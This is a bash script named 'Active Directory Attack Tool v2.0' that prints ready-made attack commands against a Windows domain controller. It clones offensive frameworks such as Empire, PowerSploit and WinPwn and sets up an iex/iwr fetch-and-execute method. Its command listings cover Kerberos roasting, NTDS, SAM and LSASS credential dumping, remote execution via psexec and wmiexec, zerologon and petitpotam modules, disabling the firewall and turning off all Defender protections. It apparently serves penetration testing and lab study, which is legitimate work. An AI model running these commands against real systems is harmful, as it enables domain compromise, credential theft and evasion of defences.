#!/bin/bash

set -e
set -u
set -o pipefail

################################################################################
# Variables                                                                    #
################################################################################

LocalIP="10.10.10.6";		#
LocalPort="8080";		#

Username="";			#
NQUsername="";			#
Password="";			#
Domain="";			#
NQDomain="";			#
IP="";				#
NQIP="";			#
LDAP="";			#
baseLDAP="";			#
DC="";				#
NS="IP";			#

EmpireRepo="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/";
NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/";
SecListsRepo="https://github.com/danielmiessler/SecLists/";
JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";



LocalRepo="False"

iwr="iex (iwr -usebasicparsing "
DownloadMethod="$iwr"




################################################################################
# Wordlists                                                                    #
################################################################################

UserList="'/usr/share/seclists/Usernames/Names/names.txt'"

################################################################################
# Colors                                                                       #
################################################################################

RESTORE='\033[0m'

RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'

LRED='\033[01;31m'
LGREEN='\033[01;32m'
LYELLOW='\033[01;33m'
LBLUE='\033[01;34m'
LPURPLE='\033[01;35m'
LCYAN='\033[01;36m'
WHITE='\033[01;37m'

IBLUE='\033[02;34m'
ICYAN='\033[02;36m'

################################################################################
# Prerequisites                                                                #
################################################################################

echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "									${LGREEN}Checking Prerequisites${RESTORE}"
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"



################################################################################
# Functions                                                                    #
################################################################################

Function_LocalRepo () {



mkdir -p $HOME/ADAT
mkdir -p $HOME/ADAT/LocalRepo
cd $HOME/ADAT


EmpireLocalRepo="$HOME/ADAT/Empire"
NishangLocalRepo="$HOME/ADAT/nishang"
PowerSploitLocalRepo="$HOME/ADAT/PowerSploit"
WinPwnLocalRepo="$HOME/ADAT/WinPwn"
JAWSLocalRepo="$HOME/ADAT/JAWS"
GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"


if [ -d "$EmpireLocalRepo" ] 
then
	echo -e ""
    	echo -e "Empire is installed, checking if updated to latest version."
    	cd $EmpireLocalRepo
    	git pull "https://github.com/BC-SECURITY/Empire.git"
    	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Empire Repo${RESTORE}"
	git clone --recursive "https://github.com/BC-SECURITY/Empire.git" $HOME/ADAT/Empire
	echo -e ""
fi

if [ -d "$NishangLocalRepo" ] 
then
    	echo -e ""
    	echo -e "Nishang is installed, checking if updated to latest version."
    	cd $NishangLocalRepo
    	git pull "https://github.com/samratashok/nishang.git"
    	echo -e "" 
else
	echo -e ""
	echo -e "${LGREEN}Cloning Nishang Repo${RESTORE}"
	git clone --recursive "https://github.com/samratashok/nishang.git" $HOME/ADAT/nishang
	echo -e ""
fi



if [ -d "$PowerSploitLocalRepo" ] 
then
	echo -e ""
    	echo -e "PowerSploit is installed, checking if updated to latest version."
    	cd $PowerSploitLocalRepo
    	git pull "https://github.com/PowerShellMafia/PowerSploit.git"
    	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning PowerSploit Repo${RESTORE}"
	git clone --recursive "https://github.com/PowerShellMafia/PowerSploit.git" $HOME/ADAT/PowerSploit
	echo -e ""
fi


if [ -d "$WinPwnLocalRepo" ] 
then
	echo -e ""
    	echo -e "WinPwn is installed, checking if updated to latest version."
    	cd $WinPwnLocalRepo
    	git pull "https://github.com/S3cur3Th1sSh1t/WinPwn.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning WinPwn Repo${RESTORE}"
	git clone --recursive "https://github.com/S3cur3Th1sSh1t/WinPwn.git" $HOME/ADAT/WinPwn
	echo -e ""
fi

if [ -d "$JAWSLocalRepo" ] 
then
	echo -e ""
    	echo -e "JAWS is installed, checking if updated to latest version."
    	cd $JAWSLocalRepo
    	git pull "https://github.com/411Hall/JAWS.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning JAWS Repo${RESTORE}"
	git clone --recursive "https://github.com/411Hall/JAWS.git" $HOME/ADAT/JAWS
	echo -e ""
fi

if [ -d "$GetSystemTechniquesLocalRepo" ] 
then
	echo -e ""
    	echo -e "Get-System-Techniques is installed, checking if updated to latest version."
    	cd $GetSystemTechniquesLocalRepo
    	git pull "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git"
 	echo -e ""
else
	echo -e ""
	echo -e "${LGREEN}Cloning Get-System-Techniques Repo${RESTORE}"
	git clone --recursive "https://github.com/S3cur3Th1sSh1t/Get-System-Techniques.git" $HOME/ADAT/Get-System-Techniques
	echo -e ""
fi

cp -r $HOME/ADAT/Empire/empire/server/data/module_source/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/nishang/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/PowerSploit/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/WinPwn/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/JAWS/* $HOME/ADAT/LocalRepo
cp -r $HOME/ADAT/Get-System-Techniques/* $HOME/ADAT/LocalRepo

python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &

echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"

}

Function_Purge (){

rm -rfv $HOME/ADAT


}


################################################################################
# Options                                                                      #
################################################################################

while [ $# -gt 0 ]; do
        key="$1"

        case "${key}" in
              
        -t | --target)
                IP="'$2'";
                NQIP="$2";
                shift
                shift
                ;;
                
        -u | --username)
                Username="'$2'";
                NQUsername="$2";
                shift
                shift
                ;;
                
        -p | --password)
                Password="'$2'";
                shift
                shift
                ;;    

        -h | --help)
                Help;
                shift
                shift
                ;;
                
        -d | --domain)
                Domain="'$2'";
                NQDomain="$2";
                shift
                shift
                ;;
                
        -l | --LDAP)
                LDAP="'$2'";
                shift
                shift
                ;;
       
        -L | --localrepo)
                EmpireRepo="http://$LocalIP:$LocalPort/"
		NishangRepo="http://$LocalIP:$LocalPort/"
		PentestFactoryRepo="http://$LocalIP:$LocalPort/"
		LazagneRepo="http://$LocalIP:$LocalPort/"
		PowerSploitRepo="http://$LocalIP:$LocalPort/"
		S3cur3Th1sSh1tRepo="http://$LocalIP:$LocalPort/"
		JAWSRepo="http://$LocalIP:$LocalPort/"
		GetSystemTechniquesRepo="http://$LocalIP:$LocalPort/"
		LocalRepo="True"
		Function_LocalRepo;
                shift
                ;;

        -P | --purge)
                Function_Purge
                break;
                shift
                shift
                ;;
                                                                                                                                                      
                
        #*)
                #POSITIONAL="${POSITIONAL} $1"
                #shift
                #;;
        esac
done

################################################################################
# Main                                                                   #
################################################################################
echo -e ""
echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "							${LGREEN}Prerequisite checks completed. Preparing to launch ADAT${RESTORE}"
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e ""
echo -e ""
echo -e ""

sleep 7

clear


################################################################################
# Banner                                                                     #
################################################################################
echo -e ""
echo -e ""
echo -e ""
echo -e "CSAgICBfICAgIF9fX18gICAgXyAgX19fX18gCgkgICAvIFwgIHwgIF8gXCAgLyBcfF8gICBffAoJICAvIF8gXCB8IHwgfCB8LyBfIFwgfCB8ICAKCSAvIF9fXyBcfCB8X3wgLyBfX18gXHwgfCAgCgkvXy8gICBcX1xfX19fL18vICAgXF9cX3w=" | base64 -d
echo -e ""
echo -e ""
echo -e "	${LGREEN}Active Directory Attack Tool v2.0${RESTORE}"
echo -e  "	${LGREEN}Author:	ViperOne${RESTORE}"
echo -e ""
echo -e ""

################################################################################
# Links                                                                     #
################################################################################

echo -e "\033[00;34mhttps://github.com/The-Viper-One/ActiveDirectoryAttackTool \e[0m"
echo -e "\033[00;34mhttps://viperone.gitbook.io/pentest-everything/everything/everything-active-directory \e[0m"
echo -e ""
echo -e ""
echo -e ""


################################################################################
# Main                                                                     #
################################################################################
echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e "	 								${LGREEN}♠ External Commands ♠${RESTORE}"	
echo -e "     	 				${LIGHTGRAY}This section is used for running scripts and commands externally against a Domain Controller${RESTORE}"															
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
echo -e "${LBLUE}┌──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Port Scan
echo -e "${LGREEN}Port Scan${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e ""
echo -e "${IBLUE}Quick Scans${RESTORE}"
echo -n -e "nmap -Pn -sV --top-ports 50 --open $IP" ;echo -e " ${YELLOW}# Top 50 ports scan${RESTORE}"
echo -n -e "nmap -Pn -sV --top-ports 100 --open $IP" ;echo -e " ${YELLOW}# Top 100 ports scan${RESTORE}"
echo -e ""
echo -e "${IBLUE}Intensive Scans${RESTORE}"
echo -n -e "nmap -Pn -p- -sS -sV -sC -v $IP" ;echo -e " ${YELLOW}# Scan all ports, version checking, script scans${RESTORE}"
echo -e ""
echo -e "${IBLUE}Vulnerability Scans${RESTORE}"
echo -n -e "nmap -Pn --script vulners -script-args mincvss=5.0 -p- -sV -v $IP" ;echo -e " ${YELLOW}# Full vuln scan${RESTORE}"
echo -n -e "nmap -Pn --script smb-vuln* -p 139,445 -v $IP" ;echo -e " ${YELLOW}# SMB vuln scan${RESTORE}"
echo -e ""
echo -e "${IBLUE}Misc Scans${RESTORE}"
echo -n -e "nmap -Pn -sU -sC -sV -v $IP # UDP Scan" ;echo -e " ${YELLOW}# UDP Scan${RESTORE}"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""


# DNS
echo -e "${LGREEN}DNS${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn --script dns-brute --script-args dns-brute.threads=12 $Domain $IP"
echo -e "nmap -Pn -n --script ""\"(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport"\"" $IP"
echo -e ""
echo -e "${IBLUE}DNSenum${RESTORE}"
echo -e "dnsenum --dnsserver $IP --enum $Domain"
echo -e ""
echo -e "${IBLUE}DNSrecon${RESTORE}"
echo -e "dnsrecon -d $Domain"
echo -e ""
echo -e "${IBLUE}Dig${RESTORE}"
echo -e "dig AXFR $Domain @$NQIP"
echo -e ""
echo -e "${IBLUE}Fierce${RESTORE}"
echo -e "fierce -dns $Domain"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Kerberos
echo -e "${LGREEN}Kerberos${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "GetNPUsers.py $Domain/ -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -e "GetNPUsers.py $Domain/$Username:$Password -request -dc-ip $IP -format 'hashcat'"
echo -e ""
echo -e "${IBLUE}Kerbrute${RESTORE}"
echo -e "kerbrute userenum $UserList --dc $IP --domain $Domain"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=$Domain,userdb=$UserList $IP"
echo -e ""
echo -e "${IBLUE}Metasploit${RESTORE}"
echo -e "msfconsole -q -x 'use auxiliary/gather/kerberos_enumusers;set rhost $IP;set DOMAIN $Domain;set USER_FILE $UserList;exploit'"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# NTP
echo -e "${LGREEN}NTP${RESTORE}"
echo -e ""
echo -e "${IBLUE}NTPdate${RESTORE}"
echo -e "sudo ntpdate $IP"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "sudo nmap -Pn -sU -p 123 --script ntp-info $IP"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# SMB
echo -e "${LGREEN}SMB${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap --script=smb-enum-users,smb-enum-shares,smb-os-discovery -Pn -p 139,445 $IP"
echo -e ""
echo -e "${IBLUE}nmblookup${RESTORE}"
echo -e "nmblookup -A $IP"
echo -e ""
echo -e "${IBLUE}enum4linux${RESTORE}"
echo -e "enum4linux -u $Username -p $Password -r $IP -w $Domain| grep 'Local User'"
echo -e ""
echo -e "${IBLUE}SMBmap${RESTORE}"
echo -e "smbmap -H $IP -u $Username -p $Password -d $Domain"
echo -e ""
echo -e "${IBLUE}SMBclient${RESTORE}"
echo -e "smbclient -U $Username -P $Password -L \\\\\\\\\\\\\\\\$NQIP -W $Domain"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --rid-brute"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --lsa"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sam"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --ntds"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --pass-pol"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --local-groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --groups"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --users"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --sessions"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --disks"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain --loggedon-users --sessions --users --groups --local-groups --pass-pol --sam --rid-brute"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -x whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# LDAP
echo -e "${LGREEN}LDAP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn -n -sV --script "\"ldap* and not brute"\" $IP"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --admin-count"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --asreproast ASREPROAST"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --groups"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --kerberoasting KERBEROASTING"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --password-not-required"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --trusted-for-delegation"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain --users"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M get-desc-users"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M laps"
echo -e "crackmapexec ldap $IP -u $Username -p $Password --kdcHost $Domain -M ldap-signing"
echo -e ""
echo -e "${IBLUE}LDAPdomaindump${RESTORE}"
echo -e "ldapdomaindump -u $NQDomain\\\\\\\\$NQUsername -p $Password ldap://$NQIP"
echo -e ""
echo -e "${IBLUE}LDAPsearch${RESTORE}"
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP""
echo -e "ldapsearch -x -H ldap://$NQIP -D '$NQDomain\\\\$NQUsername' -w $Password -b "$LDAP" | grep userPrincipalName | sed 's/userPrincipalName: //'"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# WinRM
echo -e "${LGREEN}WinRM${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -e "crackmapexec winrm $IP -u $Username -p $Password"
echo -e ""
echo -e "${IBLUE}Evil-WinRM${RESTORE}"
echo -e "evil-winrm -i $IP -u $Username -p $Password"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# MSSQL
echo -e "${LGREEN}MSSQL${RESTORE}"
echo -e ""
echo -e "${IBLUE}Nmap${RESTORE}"
echo -e "nmap -Pn -p 1433 -sU --script=ms-sql-info.nse $IP"
echo -e 
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -x whoami" ;echo -e " ${YELLOW}# PowerShell${RESTORE}"
echo -n -e "crackmapexec mssql $IP -u $Username -p $Password -d $Domain -X whoami" ;echo -e " ${YELLOW}# CMD${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "mssqlclient.py -port 1433 $Username:$Password@$NQIP"
echo -e ""
echo -e "${IBLUE}Metasploit${RESTORE}"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_ping;set rhosts $IP ;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_enum_sql_login;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_dbowner;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_escalate_execute_as;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_exec;set rhosts $IP ;set username $Username;set password $Password;set command net user;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_findandsampledata ;set rhosts $IP ;set username $Username;set password $Password;set sample_size 4;set keywords FirstName|passw|credit; exploit'"
echo -e "msfconsole -q -x 'use auxiliary/admin/mssql/mssql_sql;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_hashdump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e "msfconsole -q -x 'use auxiliary/scanner/mssql/mssql_schemadump;set rhosts $IP ;set username $Username;set password $Password;exploit'"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# BloodHound
echo -e "${LGREEN}BloodHound${RESTORE}"
echo -e "${LRED}WORK IN PROGRESS${RESTORE}"
echo -e "${RED}https://github.com/fox-it/BloodHound.py${RESTORE}"
echo -e ""
echo -e "python2 bloodhound.py -u $Username -p $Password -ns $IP -d $Domain"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Impacket
echo -e "${LGREEN}Impacket${RESTORE}"
echo -e ""
echo -e "${IBLUE}GetADUsers${RESTORE}"
echo -e "GetADUsers.py $NQDomain/$NQUsername:$Password -dc-ip $IP"
echo -e ""
echo -e "${IBLUE}GetNPUsers${RESTORE}"
echo -e "GetNPUsers.py $Domain -usersfile $UserList -dc-ip $IP -format 'hashcat'"
echo -e "GetNPUsers.py $NQDomain/$NQUsername:$Password -request -dc-ip $IP -format 'hashcat'"
echo -e ""
echo -e "${IBLUE}GetUserSPNs${RESTORE}"
echo -e "GetUserSPNs.py $NQDomain/$NQUsername:$Password -dc-ip $IP -request"
echo -e ""
echo -e "${IBLUE}lookupsid${RESTORE}"
echo -e "lookupsid.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}samrdump${RESTORE}"
echo -e "samrdump.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}services${RESTORE}"
echo -e "services.py $NQDomain/$NQUsername:$Password@$IP list"
echo -e ""
echo -e "${IBLUE}Execution Methods${RESTORE}"
echo -e "atexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "psexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "smbexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e "wmiexec.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# RDP
echo -e "${LGREEN}RDP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Crackmapexec${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -M rdp -o ACTION=enable" ;echo -e " ${YELLOW}# Enable RDP${RESTORE}"
echo -e ""
echo -e "${IBLUE}Impacket${RESTORE}"
echo -e "rdp_check.py $NQDomain/$NQUsername:$Password@$IP"
echo -e ""
echo -e "${IBLUE}xFreeRDP${RESTORE}"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard"
echo -e "xfreerdp /v:$IP /u:$Username /p:$Password /d:$Domain +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Pywerview
echo -e "${LGREEN}Pywerview${RESTORE}"
echo -e "${RED}https://github.com/the-useless-one/pywerview${RESTORE}"
echo -e ""
echo -e "${IBLUE}Information Gathering${RESTORE}"
echo -e "python3 pywerview.py get-dfsshare -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-domainpolicy -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgroup -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/samaccountname: //' | sort"
echo -e "python3 pywerview.py get-netcomputer -u $Username -p $Password -w $Domain --dc-ip $IP  | sed 's/dnshostname: //' | sort"
echo -e "python3 pywerview.py get-netdomaincontroller -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netfileserver -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgpo -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netgpogroup -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py get-netou -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/distinguishedname: //' | sort"
echo -e "python3 pywerview.py get-netsite -u $Username -p $Password -w $Domain --dc-ip $IP | sed 's/name: //' | sort"
echo -e "python3 pywerview.py get-netuser -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e ""
echo -e "${IBLUE}Hunting${RESTORE}"
echo -e "python3 pywerview.py invoke-eventhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py invoke-processhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e "python3 pywerview.py invoke-userhunter -u $Username -p $Password -w $Domain --dc-ip $IP"
echo -e ""
echo -e "${LBLUE}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐${RESTORE}"
echo -e ""

# Crackmapexec - Extra
echo -e "${LGREEN}Crackmapexec - Extra${RESTORE}"
echo -e ""
echo -e "${IBLUE}SMB${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}bloodhound${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}empire_exec -o LISRENER=<Listener_Name>${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}enum_avproducts${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}enum_dns${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}gpp_autologin${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}gpp_password${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}invoke_sessiongopher${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}lsassy${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}nanodump${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}nopac${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}rdp -o ACTION=enable${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}petitpotam${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}runasppl${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}spider_plus -o READ_ONLY=false --pattern txt${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}spooler${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}tokens${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}uac${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}wdigest -o ACTION=enable${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}wireless${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}zerologon${RESTORE}"
echo -e ""
echo -e "${IBLUE}MSSQL${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}empire_exec -o LISRENER=<Listener_Name>${RESTORE}"
echo -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain -M ${YELLOW}mssql_priv${RESTORE}"
echo -e ""
echo -e "${IBLUE}NULL Session${RESTORE}"
echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --pass-pol"
echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --users"
echo -e "crackmapexec smb $IP -u '' -p '' -d $Domain --groups"
echo -e ""
echo -e "${IBLUE}Anonymous Logon${RESTORE}"
echo -e "crackmapexec smb $IP -u 'a' -p '' -d $Domain"
echo -e ""
echo -e "${IBLUE}Firewall${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'" ;echo -e " ${YELLOW}# Disable Firewall${RESTORE}"
echo -e ""
echo -e "${IBLUE}Microsoft Defender${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select AntivirusEnabled'" ;echo -e " ${YELLOW}# Check if Defender is enabled${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL'" ;echo -e " ${YELLOW}# Check Defensive Modules${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL'" ;echo -e " ${YELLOW}# Check if tamper protection is enabled${RESTORE}"
echo -e ""
echo -e "${IBLUE}Turn off all Defender modules${RESTORE}"
echo -n -e "crackmapexec smb $IP -u $Username -p $Password -d $Domain  -X 'Set-MpPreference -DisableRealtimeMonitoring \$true;Set-MpPreference -DisableIOAVProtection \$true;Set-MPPreference -DisableBehaviorMonitoring \$true;Set-MPPreference -DisableBlockAtFirstSeen \$true;Set-MPPreference -DisableEmailScanning \$true;Set-MPPReference -DisableScriptScanning \$true;Set-MpPreference -DisableIOAVProtection \$true'"
echo -e ""
echo -e ""
